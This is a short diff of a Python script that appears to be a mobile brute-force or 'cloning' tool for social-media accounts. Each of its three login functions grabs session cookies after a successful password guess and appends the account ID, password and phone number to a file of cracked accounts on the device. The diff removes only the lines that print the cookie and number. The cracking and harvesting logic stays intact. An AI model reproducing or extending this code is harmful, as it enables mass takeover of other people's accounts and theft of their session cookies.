@@ -470,8 +470,8 @@ def a(uid,pwx,tl):
                 cid = coki[65:80]
                 print(f'\r\33[1;92m [SAHAN-𝐎𝐊] '+cid+' | '+ps+'\33[0;92m')
                 
-                print(f'\r\33[1;92m [🔢] Number : {uid}')
-                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
+
+                
                 oks.append(cid)
                 
                 open('/sdcard/SAHAN-𝐎𝐊.𝐭𝐱𝐭', 'a').write(cid+' | '+ps+' | '+uid+'\n')
@@ -538,8 +538,8 @@ def b(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f'\r\33[1;92m [SAHAN-𝐎𝐊] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\33[1;92m [🔢] Number : {uid}')
-                print(f'\r\033[1;92m [♥] COOKIE : '+coki)
+
+
                 oks.append(cid)
                 open('/sdcard/SAHAN-𝐎𝐊.𝐭𝐱𝐭', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                 break
@@ -594,8 +594,8 @@ def c(uid,pwx,tl):
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[65:80]
                 print(f'\r\33[1;92m [SAHAN-𝐎𝐊] '+cid+' | '+ps+'\33[0;92m')
-                print(f'\r\33[1;92m [🔢] Numer : {uid}')
-                #print(f'\r\033[1;92m [🍪] COOKIE : '+coki)
+
+
                 cek_apk(session,coki)
                 oks.append(cid)
                 open('/sdcard/SAHAN-𝐎𝐊.𝐭𝐱𝐭', 'a').write(cid+' | '+ps+'\n')
